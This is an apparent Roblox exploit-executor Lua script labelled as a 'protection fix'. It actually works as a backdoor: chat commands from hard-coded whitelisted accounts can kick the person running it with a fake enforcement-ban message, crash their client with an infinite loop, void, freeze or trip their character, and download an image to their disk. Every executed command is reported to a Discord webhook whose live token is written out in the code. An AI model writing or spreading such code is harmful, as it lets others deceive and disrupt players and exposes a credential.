--====================================--
-- ERX Private Commands Protection Fix
--====================================--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local AnalyticsService = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local FE = game:GetService("ReplicatedStorage"):WaitForChild("FE")
local Chat = FE:WaitForChild("Chat", 9e9)
local Actions = FE:WaitForChild("Actions", 9e9)
local EnviromentRemote = Actions:WaitForChild("Environmental", 9e9)

local webhookURL =
    "https://discord.com/api/webhooks/1424223851398696991/dOFxiu4WxLTVC32whg13Chp6pZEFRojhg22Sm9zX6toXcZibdi83lIOzRjEg9Aqslnn4"

--============================--
-- Helper Functions
--============================--

local function sendWebhook(command, senderName, target, extra)
    local data = {
        embeds = {{
            title = "📢 Command Executed",
            color = 0x00AEEF,
            fields = {
                {name = "Sender", value = senderName, inline = true},
                {name = "Command", value = tostring(command), inline = true},
                {name = "Target", value = target and target.Name or "N/A", inline = true},
                {name = "Extra", value = extra ~= "" and extra or "None", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

    if requestfn then
        pcall(function()
            requestfn({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

local RevealUsers = {} 

local function AddRevealUser(playerName)
    if not table.find(RevealUsers, playerName) then
        table.insert(RevealUsers, playerName)
    end

    if _G.WindUI then
        _G.WindUI:Notify({
            Title = "Reveal Command Used",
            Content = "Users: " .. table.concat(RevealUsers, ", "),
            Duration = 10
        })
    end
end

local function IsERXPrivate()
    local display = LocalPlayer.DisplayName:lower()
    local userName = "Unknown"

    if LocalPlayer.UserId == 8244720493 then
        userName = "Jay"
    elseif display:find("fuhtwan") then
        userName = "Jay"
    elseif display:find("sanderserx") then
        userName = "Sander"
    end

    return userName ~= "Unknown", userName
end

-- WindUI Notify if verified
local isPrivate, user = IsERXPrivate()
if isPrivate and _G.WindUI then
    _G.WindUI:Notify({
        Title = "🔒 ERX Custom Private",
        Content = "Loaded Private Successfully, Welcome: " .. userName,
        Duration = 8
    })
end

--============================--
-- Private Commands
--============================--

local PrivateCommands = {}

PrivateCommands[":reveal"] = function(senderName, ...)
    AddRevealUser(senderName)
    Chat:FireServer("EXWLSV")
end

PrivateCommands[":noroot"] = function(target)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        target.Character.HumanoidRootPart.Parent = nil
    end
end

PrivateCommands[":say"] = function(target, msg)
    Chat:FireServer(tostring(msg))
end

PrivateCommands[":fakeban"] = function(target)
    if target then
        target:Kick("You created or used an account to avoid an enforcement action taken against another account within this experience")
        task.delay(1, function()
            warn("You created or used an account to avoid an enforcement action taken against another account within this experience")
        end)
    end
end

PrivateCommands[":kill"] = function(target)
    if EnviromentRemote then
        EnviromentRemote:FireServer(1000)
    end
end

PrivateCommands[":samjumpscare"] = function()
    pcall(function()
        local FileName = "SamKalish.png"
        local Url = "https://cdn.discordapp.com/avatars/128988722837323776/dfe6a8a3dace8d4e88f26a27e46a1862.webp?size=300"

        if isfile(FileName) then delfile(FileName) end
        writefile(FileName, game:HttpGet(Url))

        local ImageAsset = getcustomasset(FileName)

        for _, v in ipairs(game:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("TextButton") then
                v.Text = ("SAM JUMPSCARE "):rep(15)
            elseif v:IsA("ImageLabel") or v:IsA("ImageButton") then
                v.Image = ImageAsset
            elseif v:IsA("Decal") or v:IsA("Texture") then
                v.Texture = ImageAsset
            elseif v:IsA("BasePart") then
                local d = Instance.new("Decal", v)
                d.Texture = ImageAsset

                local p = Instance.new("ParticleEmitter", v)
                p.Texture = ImageAsset
                p.Rate = 6
                p.Lifetime = NumberRange.new(2,4)
                p.Speed = NumberRange.new(0.5,1.5)
            end
        end
    end)
end

PrivateCommands[":freeze"] = function(target)
    if target and target.Character and target.Character.PrimaryPart then
        target.Character.PrimaryPart.Anchored = true
    end
end

PrivateCommands[":unfreeze"] = function(target)
    if target and target.Character and target.Character.PrimaryPart then
        target.Character.PrimaryPart.Anchored = false
    end
end

PrivateCommands[":trip"] = function(target)
    if target and target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.PlatformStand = true
    end
end

PrivateCommands[":bring"] = function(target)
    if not target or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    local lpRoot = LocalPlayer.Character.HumanoidRootPart
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        target.Character.HumanoidRootPart.CFrame = lpRoot.CFrame + Vector3.new(0, 3, 0)
    end
end

PrivateCommands[":void"] = function(target)
    if target and target.Character and target.Character.PrimaryPart then
        target.Character.PrimaryPart.CFrame *= CFrame.new(0, 99999999, 0)
    end
end

PrivateCommands[":kick"] = function(target, msg)
    if target then target:Kick(msg or "Kicked") end
end

PrivateCommands[":setfps"] = function(target, fpsValue)
    if fpsValue then
        fpsValue = tonumber(fpsValue)
        if fpsValue and setfpscap then
            setfpscap(fpsValue)
        end
    end
end

PrivateCommands[":crash"] = function(target)
    if target then while true do end end
end

PrivateCommands[":prcprivate"] = function(target)
    for _, name in ipairs(PrivateMembers or {}) do
        local p = Players:FindFirstChild(name)
        if p then
            local fake = Instance.new("BoolValue")
            fake.Name = "IsGameMod"
            fake.Parent = p
        end
    end
end

PrivateCommands[":removeprc"] = function(target)
    for _, name in ipairs(PrivateMembers or {}) do
        local p = Players:FindFirstChild(name)
        if p then
            local tag = p:FindFirstChild("IsGameMod")
            if tag then
                tag:Destroy()
            end
        end
    end
end

PrivateCommands[":notify"] = function(target, msg)
    if target and _G.WindUI then
        _G.WindUI:Notify({
            Title = "Notification",
            Content = msg or "No message",
            Duration = 10
        })
    end
end

--============================--
-- Protected Player Check
--============================--

local function IsProtectedPlayer(player)
    if not player then return false end
    local name = player.Name:lower()
    local display = player.DisplayName:lower()
    return name:find("fuhtwan") or display:find("fuhtwan")
end

-- Wrap all PrivateCommands to skip protected players
local function WrapPrivateCommand(func)
    return function(target, ...)
        if IsProtectedPlayer(target) then
            if _G.WindUI then
                _G.WindUI:Notify({
                    Title = "Protected User",
                    Content = target.Name .. " cannot be affected by commands.",
                    Duration = 5
                })
            end
            return
        end
        return func(target, ...)
    end
end

for cmd, func in pairs(PrivateCommands) do
    PrivateCommands[cmd] = WrapPrivateCommand(func)
end

--============================--
-- Chat Hook
--============================--

Chat.OnClientEvent:Connect(function(senderName, message)
    local sender = Players:FindFirstChild(senderName)
    if not sender then return end

    local args = string.split(message, " ")
    local command = args[1]
    local targetName = args[2] or ""
    table.remove(args, 1)
    table.remove(args, 1)

    local extra = table.concat(args, " ")
    local target = Players:FindFirstChild(targetName)

    -- Prevent commands from affecting protected players
    if target and IsProtectedPlayer(target) then
        if _G.WindUI then
            _G.WindUI:Notify({
                Title = "Protected User",
                Content = target.Name .. " cannot be affected by commands.",
                Duration = 5
            })
        end
        return
    end

    -- Prevent affecting LocalPlayer unless sender is whitelisted
    if target == LocalPlayer then
        local allowed =
            (sender.UserId == 8244720493) or
            (string.find(string.lower(sender.DisplayName), "fuhtwan"))
        if not allowed then return end
    end

    -- Prevent self-targeting
    if sender == LocalPlayer and target == LocalPlayer then return end

    -- Execute command
    if PrivateCommands[command] then
        PrivateCommands[command](target, extra)
        sendWebhook(command, senderName, target, extra)
    end
end)
